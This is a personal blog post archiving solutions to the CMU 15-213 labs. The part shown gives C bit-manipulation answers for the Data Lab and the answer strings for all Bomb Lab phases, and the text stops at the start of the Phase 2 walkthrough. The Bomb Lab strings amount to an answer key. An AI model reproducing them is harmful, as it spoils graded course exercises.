<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="This post is an archive for my personal solutions to the ten labs for the CMU 15213 course. You can access the self-study labs at the CSAPP official website.">
<meta property="og:type" content="article">
<meta property="og:title" content="Solutions to CMU 15213 Labs">
<meta property="og:url" content="http://sulley.cc/2024/09/01/20/06/index.html">
<meta property="og:site_name" content="Sulley">
<meta property="og:description" content="This post is an archive for my personal solutions to the ten labs for the CMU 15213 course. You can access the self-study labs at the CSAPP official website.">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-09-01T12:06:21.000Z">
<meta property="article:modified_time" content="2024-09-20T03:28:15.974Z">
<meta property="article:author" content="Sulley">
<meta property="article:tag" content="数学">
<meta property="article:tag" content="随笔">
<meta property="article:tag" content="计算机">
<meta property="article:tag" content="汇编">
<meta property="article:tag" content="硬件">
<meta property="article:tag" content="CSAPP">
<meta property="article:tag" content="CMU15213">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Solutions to CMU 15213 Labs</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/resources/">Resources</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/09/16/20/06/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/06/18/20/06/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://sulley.cc/2024/09/01/20/06/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://sulley.cc/2024/09/01/20/06/&text=Solutions to CMU 15213 Labs"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://sulley.cc/2024/09/01/20/06/&is_video=false&description=Solutions to CMU 15213 Labs"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Solutions to CMU 15213 Labs&body=Check out this article: http://sulley.cc/2024/09/01/20/06/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://sulley.cc/2024/09/01/20/06/&title=Solutions to CMU 15213 Labs"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://sulley.cc/2024/09/01/20/06/&name=Solutions to CMU 15213 Labs&description=&lt;p&gt;This post is an archive for my personal solutions to the ten labs for
the CMU 15213 course. You can access the self-study labs at the CSAPP
official &lt;a href=&#34;https://csapp.cs.cmu.edu/3e/labs.html&#34;&gt;website&lt;/a&gt;.&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://sulley.cc/2024/09/01/20/06/&t=Solutions to CMU 15213 Labs"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-1-data-lab"><span class="toc-number">1.</span> <span class="toc-text">Lab 1: Data Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-2-bomb-lab"><span class="toc-number">2.</span> <span class="toc-text">Lab 2: Bomb Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-3-attack-lab"><span class="toc-number">3.</span> <span class="toc-text">Lab 3: Attack Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-4-architecture-lab"><span class="toc-number">4.</span> <span class="toc-text">Lab 4: Architecture Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-5-cache-lab"><span class="toc-number">5.</span> <span class="toc-text">Lab 5: Cache Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-6-performance-lab"><span class="toc-number">6.</span> <span class="toc-text">Lab 6: Performance Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-7-shell-lab"><span class="toc-number">7.</span> <span class="toc-text">Lab 7: Shell Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-8-malloc-lab"><span class="toc-number">8.</span> <span class="toc-text">Lab 8: Malloc Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-9-proxy-lab"><span class="toc-number">9.</span> <span class="toc-text">Lab 9: Proxy Lab</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Solutions to CMU 15213 Labs
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Sulley</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-09-01T12:06:21.000Z" class="dt-published" itemprop="datePublished">2024-09-01</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA-%E5%9F%BA%E7%A1%80/">计算机 - 基础</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CMU15213/" rel="tag">CMU15213</a>, <a class="p-category" href="/tags/CSAPP/" rel="tag">CSAPP</a>, <a class="p-category" href="/tags/%E6%95%B0%E5%AD%A6/" rel="tag">数学</a>, <a class="p-category" href="/tags/%E6%B1%87%E7%BC%96/" rel="tag">汇编</a>, <a class="p-category" href="/tags/%E7%A1%AC%E4%BB%B6/" rel="tag">硬件</a>, <a class="p-category" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/" rel="tag">计算机</a>, <a class="p-category" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>This post is an archive for my personal solutions to the ten labs for
the CMU 15213 course. You can access the self-study labs at the CSAPP
official <a target="_blank" rel="noopener" href="https://csapp.cs.cmu.edu/3e/labs.html">website</a>.</p>
<span id="more"></span>
<h1 id="lab-1-data-lab">Lab 1: Data Lab</h1>
<p>This lab instructs you to write functions using bit-wise
operations.</p>
<p><strong>bixXor</strong></p>
<p>Implements <code>xor</code> using only <code>~</code> and
<code>&amp;</code>. The key is to notice that
<code>x | y == ~(~x &amp; ~y)</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int bitXor(int x, int y) {</span><br><span class="line">  return ~(~(~x &amp; y) &amp; ~(x &amp; ~y));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>tmin</strong></p>
<p>Returns the minimum two's complement integer.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int tmin(void) {</span><br><span class="line">  return 1 &lt;&lt; 31;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>isTmax</strong></p>
<p>Checks if the input is the maximum two's complement integer. Notice
that the maximum integer has a leading <code>0</code> and all remaining
bits are <code>1</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int isTmax(int x) {</span><br><span class="line">  return !((x + 1) ^ ~x) &amp; !!(x ^ ~0);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>Another way to think the maximum integer is, it's the only number
that equals to <code>0</code> when adding
<code>(1 &lt;&lt; 31) + 1</code>. So we can also use the following
simpler code:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int isTmax(int x) {</span><br><span class="line">  return !(x + (1 &lt;&lt; 31) + 1);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>allOddBits</strong></p>
<p>Checks if all odd index bits are set to 1. You can create a mask to
detect the pattern.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int allOddBits(int x) {</span><br><span class="line">  int m = (0xAA &lt;&lt; 8) + 0xAA;</span><br><span class="line">  m = (m &lt;&lt; 16) + m;</span><br><span class="line">  return !(m ^ (m &amp; x));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>negate</strong></p>
<p>Negates the input.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int negate(int x) {</span><br><span class="line">  return ~x + 1;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>isAsciiDigit</strong></p>
<p>Checks if the input is an ASCII digit, e.g., hex representation
between <code>0x30</code> and <code>0x39</code>. We can divide the
pattern into the parts. The first part is <code>0x30</code>, and the
second is <code>0x0?</code> where <code>?</code> can be <code>0</code>
to <code>9</code>. When examining the second part, the least significant
byte either does not exceed <code>1000</code> (<code>0x8</code>), or is
exactly <code>0x8</code> or <code>0x9</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int isAsciiDigit(int x) {</span><br><span class="line">  int y = 0xF &amp; x;</span><br><span class="line">  return !((0x30 ^ x) &gt;&gt; 4) &amp; (!(0x8 &amp; y) | !(0x8 ^ y) | !(0x9 ^ y));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>conditional</strong></p>
<p>Implements the conditional operator <code>x ? x : y</code>. Just use
mask to achieve it.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int conditional(int x, int y, int z) {</span><br><span class="line">  int m = ~(!x) + 1;</span><br><span class="line">  return (~m &amp; y) | (m &amp; z);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>isLessOrEqual</strong></p>
<p>Checks if the first argument is less or equal than the second
argument. You can use <code>-x == ~x + 1</code> and examine the sign
bit.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int isLessOrEqual(int x, int y) {</span><br><span class="line">  return !(((~x + 1) + y) &gt;&gt; 31);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>logicalNeg</strong></p>
<p>Implements the <code>!</code> operator. That's, for any non-zero
number, it returns <code>0</code> and for zero it returns
<code>1</code>. If the input is negative (the sign bit is
<code>1</code>), or the input added with <code>-1</code> overflows then
the input is non-zero.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int logicalNeg(int x) {</span><br><span class="line">  return (((x &gt;&gt; 31) ^ 0x1) &amp; 0x1) &amp; ((((x + (~1 + 1)) &gt;&gt; 31) ^ 0x0) &amp; 0x1);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>howManyBits</strong></p>
<p>Returns the minimum number of bits required to represent the input
integer. Note that a positive integer implies a leading <code>0</code>
and a negative integer implies a leading <code>1</code>. Therefore in
either case, we must at least have a sign bit. We can safely invert all
bits of a negative integer and from the most significant bit to the
least significant bit find the index at which the bit is
<code>1</code>.</p>
<p>The trick here is to binary-search such index. To do this, we must
create several masks, shown as in the following code. For example,
<code>Mask_16 = 0xFFFF0000</code> detects whether any of the most
significant 16 bits is <code>1</code>. If so, it means the result is
<em>at least</em> 16. Then we can right shift the number 16 bits to
recursively examine the most significant 16 bits by applying
<code>Mask_8 = 0xFF00</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">int howManyBits(int x) {</span><br><span class="line">  int ToPositive = x ^ (x &gt;&gt; 31);</span><br><span class="line">  int Mask_0 = 0x1;</span><br><span class="line">  int Mask_1 = 0x2;</span><br><span class="line">  int Mask_2 = 0xC;</span><br><span class="line">  int Mask_4 = 0xF0;</span><br><span class="line">  int Mask_8 = 0xFF &lt;&lt; 8;</span><br><span class="line">  int Mask_16 = (Mask_8 | 0xFF) &lt;&lt; 16;</span><br><span class="line"></span><br><span class="line">  int Count, Result = 1;</span><br><span class="line">  Count = !!(ToPositive &amp; Mask_16) &lt;&lt; 4;</span><br><span class="line">  Result += Count;</span><br><span class="line">  ToPositive = ToPositive &gt;&gt; Count;</span><br><span class="line"></span><br><span class="line">  Count = !!(ToPositive &amp; Mask_8) &lt;&lt; 3;</span><br><span class="line">  Result += Count;</span><br><span class="line">  ToPositive = ToPositive &gt;&gt; Count;</span><br><span class="line"></span><br><span class="line">  Count = !!(ToPositive &amp; Mask_4) &lt;&lt; 2;</span><br><span class="line">  Result += Count;</span><br><span class="line">  ToPositive = ToPositive &gt;&gt; Count;</span><br><span class="line"></span><br><span class="line">  Count = !!(ToPositive &amp; Mask_2) &lt;&lt; 1;</span><br><span class="line">  Result += Count;</span><br><span class="line">  ToPositive = ToPositive &gt;&gt; Count;</span><br><span class="line"></span><br><span class="line">  Count = !!(ToPositive &amp; Mask_1);</span><br><span class="line">  Result += Count;</span><br><span class="line">  ToPositive = ToPositive &gt;&gt; Count;</span><br><span class="line"></span><br><span class="line">  Count = !!(ToPositive &amp; Mask_0);</span><br><span class="line">  Result += Count;</span><br><span class="line"></span><br><span class="line">  return Result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>floatScale2</strong></p>
<p>Returns <code>2*f</code> where the input is interpreted as a
floating-point number. You should be careful about the border cases. If
the input number is NaN or infinity (i.e. the exponent is all ones), the
function returns the input as required. If the input is denormalized
(i.e. the exponent is all zeros), the input will be shifted left 1 bit.
If it's normalized (i.e. the exponent is neither all zeros nor all
zeros), we just add one to the exponent.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">unsigned floatScale2(unsigned uf) {</span><br><span class="line">  int MantissaMask = 0x7FFFFF,   Mantissa = MantissaMask &amp; uf;</span><br><span class="line">  int ExponentMask = 0xFF &lt;&lt; 23, Exponent = ExponentMask &amp; uf; </span><br><span class="line">  int Sign = (0x1 &lt;&lt; 31) &amp; uf;</span><br><span class="line"></span><br><span class="line">  int IsNaNOrInfinity = !(ExponentMask ^ Exponent);</span><br><span class="line">  int IsDenormalized = !(ExponentMask &amp; Exponent);</span><br><span class="line">  if (IsNaNOrInfinity) </span><br><span class="line">  {</span><br><span class="line">    return uf;</span><br><span class="line">  }</span><br><span class="line">  else if (IsDenormalized)</span><br><span class="line">  {</span><br><span class="line">    int ExceptSign = uf &lt;&lt; 1;</span><br><span class="line">    return Sign | ExceptSign;</span><br><span class="line">  }</span><br><span class="line">  else </span><br><span class="line">  {</span><br><span class="line">    int NewExponent = ExponentMask &amp; (Exponent + (1 &lt;&lt; 23));</span><br><span class="line">    return Sign | NewExponent | Mantissa;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>floatFloat2Int</strong></p>
<p>Returns bit-level equivalent of <code>(int) x</code> where
<code>x</code> is interpreted as a floating number. Be aware of the
border cases: (1) if the input is zero, the function also returns zero;
(2) if the input is NaN or infinity, it returns <code>0x80000000u</code>
as required; (3) if the input is denormalized, it returns zero; (4) if
the input is normalized, determine the result by checking the
exponent.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">int floatFloat2Int(unsigned uf) {</span><br><span class="line">  int MantissaMask = 0x007FFFFF, Mantissa = MantissaMask &amp; uf;</span><br><span class="line">  int ExponentMask = 0x7F800000, Exponent = ExponentMask &amp; uf; </span><br><span class="line">  int SignMask     = 0x80000000, Sign     = SignMask &amp; uf;</span><br><span class="line">  </span><br><span class="line">  int Exp = (Exponent &gt;&gt; 23) - 127, Result, i, BitMask; </span><br><span class="line">      </span><br><span class="line">  int IsNaNOrInfinity = !(ExponentMask ^ Exponent);</span><br><span class="line">  int IsDenormalized = !(ExponentMask &amp; Exponent);</span><br><span class="line">  int IsNegative = !(SignMask ^ Sign);</span><br><span class="line"></span><br><span class="line">  // Is +0 or -0</span><br><span class="line">  if (!(uf &lt;&lt; 1))</span><br><span class="line">  {</span><br><span class="line">    return 0;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  // Is NaN or infinity.</span><br><span class="line">  if (IsNaNOrInfinity)</span><br><span class="line">  {</span><br><span class="line">    return 0x80000000u;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  // Is denormalized</span><br><span class="line">  if (IsDenormalized)</span><br><span class="line">  {</span><br><span class="line">    return 0;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  // Is normalized</span><br><span class="line">  if (Exp &lt; 0)</span><br><span class="line">  {</span><br><span class="line">    return 0;</span><br><span class="line">  }</span><br><span class="line">  if (Exp &gt;= 31)</span><br><span class="line">  {</span><br><span class="line">    return 0x80000000u;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  Result = 1 &lt;&lt; Exp;</span><br><span class="line">  Exp -= 1;</span><br><span class="line">  for (i = 22; i &gt;= 0 &amp;&amp; Exp &gt;= 0; --i, --Exp)</span><br><span class="line">  {</span><br><span class="line">    BitMask = !!(Mantissa &amp; (1 &lt;&lt; i));</span><br><span class="line">    Result += BitMask * (1 &lt;&lt; Exp);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  if (IsNegative)</span><br><span class="line">  {</span><br><span class="line">    Result = -Result;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  return Result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p><strong>floatPower2</strong></p>
<p>Returns <code>2.0^x</code> for any given integer <code>x</code>. The
smallest non-zero floating (denormalized) number is
<code>2^(-126+23)=2^(-149)</code>. So if the input is smaller than
<code>-149</code>, the functions should return <code>0</code>. The
largest denormalized floating number in the form of <code>2.0^x</code>
is <code>x^(-127)</code>. In the range of <code>-149</code> and
<code>-127</code>, we just left shift one by <code>x+149</code>. The
smallest normalized number (also, in the form of <code>2.0^x</code>) is
<code>2^(-126)</code> and the largest is
<code>2^(254-127)=2^(127)</code>. In this case, we left shift
<code>x+127</code> by <code>23</code> to occupy the exponent part. If
<code>x</code> exceeds <code>127</code>, the function returns
<code>+INF</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">unsigned floatPower2(int x) {</span><br><span class="line">  if (x &lt; -149)</span><br><span class="line">  {</span><br><span class="line">    return 0;</span><br><span class="line">  }</span><br><span class="line">  else if (x &lt;= -127)</span><br><span class="line">  {</span><br><span class="line">    return 1 &lt;&lt; (x + 149);</span><br><span class="line">  }</span><br><span class="line">  else if (x &lt;= 127)</span><br><span class="line">  {</span><br><span class="line">    return (x + 127) &lt;&lt; 23;</span><br><span class="line">  }</span><br><span class="line">  else // x &gt; 127</span><br><span class="line">  {</span><br><span class="line">    return 0x7F800000;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<h1 id="lab-2-bomb-lab">Lab 2: Bomb Lab</h1>
<p>The answers to the six phases are respectively:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 207</span><br><span class="line">7 0</span><br><span class="line">iOnUvW</span><br><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>
<p>If we deciphered the secret phase, the answers will be (adding string
<code>DrEvil</code> after the third line):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 207</span><br><span class="line">7 0 DrEvil</span><br><span class="line">iOnUvW</span><br><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>
<p>Note that some of the answers are not unique. Let's quickly go
through these phases.</p>
<p><strong>Phase 1</strong></p>
<p>Find the string at address <code>0x402400</code>. You can use
<code>x/s 402400</code> to extract it!</p>
<p><strong>Phase 2</strong></p>
<p>The key to solve this phase is know the functionality of each
register:</p>
<ul>
<li><code>%rdi</code>: the first argument.</li>
<li><code>%rsi</code>: the second argument.</li>
<li><code>%rdx</code>: the third argument.</li>
